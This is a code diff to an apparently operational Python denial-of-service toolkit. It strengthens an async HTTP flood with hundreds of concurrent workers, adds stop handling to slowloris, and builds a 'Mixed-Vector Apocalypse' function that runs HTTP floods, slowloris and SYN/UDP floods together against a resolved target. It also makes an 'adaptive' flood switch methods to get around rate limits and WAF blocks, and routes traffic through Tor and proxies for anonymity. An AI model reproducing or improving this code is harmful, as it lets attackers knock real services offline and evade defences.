@@ -4,6 +4,8 @@ import requests
 import asyncio
 import aiohttp
 import threading
+import socket
+from urllib.parse import urlparse
 from src.config import CONFIG
 # IP-HUNTER-SIGNATURE-NT-191q275zj684-riridori
 from src.utils.network import get_random_headers, generate_stealth_headers
@@ -12,42 +14,37 @@ from src.security import decrement_thread_counter, stop_event
 from src.utils.logging import add_system_log
 
 async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
-    """Advanced asynchronous HTTP flood"""
-    connector = aiohttp.TCPConnector(limit=1000)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        stealth_headers = generate_stealth_headers() if stealth_mode else None
-        end_time = time.time() + duration
-        tasks = []
+    """Extreme performance asynchronous HTTP flood with persistent workers"""
+    connector = aiohttp.TCPConnector(limit=2000, ssl=False, force_close=True)
+    timeout = aiohttp.ClientTimeout(total=5)
+    end_time = time.time() + duration
 
-        while time.time() < end_time:
+    async def worker(session):
+        while time.time() < end_time and not stop_event.is_set():
             if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                 break
+            try:
+                if use_tor:
+                    proxy = CONFIG['TOR_PROXY']
+                else:
+                    proxy = random.choice(proxies_list) if proxies_list else None
+                
+                headers = generate_stealth_headers() if stealth_mode else get_random_headers()
+                async with session.get(url, headers=headers, proxy=proxy, timeout=timeout) as response:
+                    # We don't await read() if we just want to hammer the server
+                    if monitor:
+                        monitor.update_stats(packets=1)
+            except:
+                if monitor: monitor.update_stats(failed=1)
+                await asyncio.sleep(0.01) # Small backoff on error
 
-            if use_tor:
-                proxy = CONFIG['TOR_PROXY']
-            else:
-                proxy = random.choice(proxies_list) if proxies_list else None
-            
-            headers = stealth_headers if stealth_mode else get_random_headers()
-            tasks.append(session.get(url, headers=headers, proxy=proxy))
-
-            if len(tasks) >= 1000:
-                results = await asyncio.gather(*tasks, return_exceptions=True)
-                if monitor:
-                    successful = sum(1 for r in results if not isinstance(r, Exception))
-                    failed = len(results) - successful
-                    monitor.update_stats(packets=successful, failed=failed)
-                tasks = []
-
-        if tasks:
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            if monitor:
-                successful = sum(1 for r in results if not isinstance(r, Exception))
-                failed = len(results) - successful
-                monitor.update_stats(packets=successful, failed=failed)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        workers = [asyncio.create_task(worker(session)) for _ in range(500)]
+        await asyncio.gather(*workers)
 
 def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
     """Basic HTTP GET flood with proxy support"""
+    from src.security import increment_socket_counter, decrement_socket_counter
     try:
         end_time = time.time() + duration
         session = requests.Session()
@@ -59,6 +56,7 @@ def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_to
                 break
 
             try:
+                increment_socket_counter()
                 if use_tor:
                     proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']}
                 else:
@@ -71,10 +69,12 @@ def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_to
                     randomize_timing()
                 if monitor:
                     monitor.update_stats(packets=1, bytes_sent=len(response.content) if response.content else 0)
-            except:
+            except Exception as e:
                 if monitor:
                     monitor.update_stats(failed=1)
                 continue
+            finally:
+                decrement_socket_counter()
     finally:
         decrement_thread_counter()
 
@@ -111,7 +111,12 @@ def slowloris_attack(target_ip, target_port, duration, socket_count=500):
                     sockets.remove(s)
                     new_s = create_socket()
                     if new_s: sockets.append(new_s)
-            time.sleep(15)
+            
+            # Use smaller sleep chunks and check stop_event
+            for _ in range(15):
+                if time.time() >= end_time or stop_event.is_set():
+                    break
+                time.sleep(1)
     finally:
         for s in sockets:
             try: s.close()
@@ -334,60 +339,127 @@ def slowpost_attack(url, duration, monitor=None):
     threading.Thread(target=slow_post, daemon=True).start()
 
 def mixed_flood(url, duration, proxies=None, monitor=None):
-    """Combined attack: alternates between GET, POST, and HEAD"""
-    add_system_log(f"[bold red]MIXED:[/] Starting multi-vector L7 flood on {url}")
+    """
+    [ID 33] Mixed-Vector Apocalypse Attack
+    Combines L7 HTTP Floods, Slowloris, and L4 (SYN/UDP) vectors for maximum impact.
+    """
+    from src.attacks.l4 import syn_flood, udp_flood
+    add_system_log(f"[bold red]APOCALYPSE:[/] Initiating hybrid vector swarm on {url}")
+    
+    parsed = urlparse(url)
+    target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    target_ip = None
+    
+    try:
+        target_ip = socket.gethostbyname(parsed.hostname)
+    except:
+        add_system_log(f"[bold yellow]WARNING:[/] Failed to resolve {parsed.hostname} for L4 vectors")
+
+    threads = []
     end_time = time.time() + duration
     
-    while time.time() < end_time:
-        try:
-            method = random.choice([requests.get, requests.post, requests.head])
-            headers = generate_stealth_headers()
-            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
-            
-            if method == requests.post:
-                method(url, headers=headers, proxies=proxy, data={"q": random.random()}, timeout=5)
-            else:
-                method(url, headers=headers, proxies=proxy, timeout=5)
-                
-            if monitor: monitor.update_stats(packets=1)
-        except:
-            if monitor: monitor.update_stats(failed=1)
+    # 1. Async L7 Swarm (Extreme Performance)
+    def l7_swarm():
+        # High concurrency L7 swarm using our async engine
+        asyncio.run(async_http_flood(url, duration, proxies, monitor, stealth_mode=True))
+    
+    # 2. Slowloris Vector (Connection Exhaustion)
+    def slowloris_swarm():
+        end_loris = time.time() + duration
+        while time.time() < end_loris and not stop_event.is_set():
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(4)
+                s.connect((parsed.hostname, target_port))
+                s.send(f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n".encode())
+                s.send(f"Host: {parsed.hostname}\r\n".encode())
+                s.send(f"User-Agent: {random.choice(CONFIG['USER_AGENTS'])}\r\n".encode())
+                s.send("\r\n".encode())
+                while time.time() < end_loris and not stop_event.is_set():
+                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+                    time.sleep(random.randint(10, 15))
+            except:
+                time.sleep(0.5)
+
+    # Launch L7 & Slowloris
+    for task in [l7_swarm, slowloris_swarm]:
+        t = threading.Thread(target=task, daemon=True)
+        t.start()
+        threads.append(t)
+    
+    # 3. L4 Vectors (Only if IP is resolved)
+    if target_ip:
+        # SYN Flood (Requires root/admin usually, but Scapy handles it)
+        t_syn = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration, monitor), daemon=True)
+        t_syn.start()
+        threads.append(t_syn)
+        
+        # UDP Flood
+        t_udp = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, monitor), daemon=True)
+        t_udp.start()
+        threads.append(t_udp)
+
+    # Wait for completion
+    while time.time() < end_time and not stop_event.is_set():
+        time.sleep(1)
 
 def adaptive_flood(url, duration, proxies=None, monitor=None):
-    """AI-Adaptive Smart Flood: Adjusts intensity based on server feedback"""
+    """AI-Adaptive Smart Flood: Adjusts intensity and methods based on server feedback"""
     end_time = time.time() + duration
-    intensity = 1.0 # Current intensity multiplier (0.1 to 2.0)
+    intensity = 1.0 # Current intensity multiplier (0.1 to 3.0)
     delay = 0.05
+    methods = ["GET", "POST", "HEAD"]
+    current_method = "GET"
     
     add_system_log(f"[bold cyan]AI-ADAPTIVE:[/] Initiating smart flood on {url}")
     
-    while time.time() < end_time:
+    session = requests.Session()
+    
+    while time.time() < end_time and not stop_event.is_set():
         try:
             proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
             headers = generate_stealth_headers()
             
             start_req = time.time()
-            resp = requests.get(url, headers=headers, proxies=proxy, timeout=5)
+            if current_method == "GET":
+                resp = session.get(url, headers=headers, proxies=proxy, timeout=5)
+            elif current_method == "POST":
+                data = {random.choice(["id", "user", "data"]): random.randint(1000, 9999)}
+                resp = session.post(url, headers=headers, data=data, proxies=proxy, timeout=5)
+            else: # HEAD
+                resp = session.head(url, headers=headers, proxies=proxy, timeout=5)
+            
             latency = time.time() - start_req
             
             # --- AI LOGIC: Adaptive Response ---
             if resp.status_code == 200:
-                intensity = min(2.0, intensity + 0.05)
+                # Server is healthy, ramp up!
+                intensity = min(3.0, intensity + 0.1)
                 delay = max(0.001, delay - 0.005)
+                # Keep current method as it works
             elif resp.status_code == 429 or resp.status_code == 503:
-                intensity = max(0.1, intensity - 0.3)
-                delay = min(1.0, delay + 0.2)
-                add_system_log(f"[yellow]ADAPTIVE:[/] Server pressured (Code {resp.status_code}), slowing down...")
+                # Rate limited or Overloaded, back off significantly
+                intensity = max(0.1, intensity - 0.5)
+                delay = min(2.0, delay + 0.5)
+                # Switch method to see if another path is less protected
+                current_method = random.choice(methods)
+                add_system_log(f"[yellow]ADAPTIVE:[/] Server pressured (Code {resp.status_code}), slowing & switching to {current_method}")
             elif resp.status_code == 403:
-                add_system_log(f"[red]ADAPTIVE:[/] WAF Block detected (403), rotating headers/proxies...")
-                headers = generate_stealth_headers()
-                time.sleep(1)
+                # WAF Block, stop for a bit and rotate everything
+                add_system_log(f"[red]ADAPTIVE:[/] WAF Block (403), rotating headers and pausing...")
+                time.sleep(2)
+                current_method = random.choice(methods)
             
             if monitor:
-                monitor.update_stats(packets=1, bytes_sent=len(resp.content) if resp.content else 0)
+                size = len(resp.content) if hasattr(resp, 'content') and resp.content else 0
+                monitor.update_stats(packets=1, bytes_sent=size)
             
-            time.sleep(delay / intensity)
+            # Dynamic sleep based on adaptive parameters
+            actual_delay = delay / intensity
+            if actual_delay > 0:
+                time.sleep(actual_delay)
             
         except Exception:
             if monitor: monitor.update_stats(failed=1)
             time.sleep(0.5)
+            current_method = random.choice(methods)
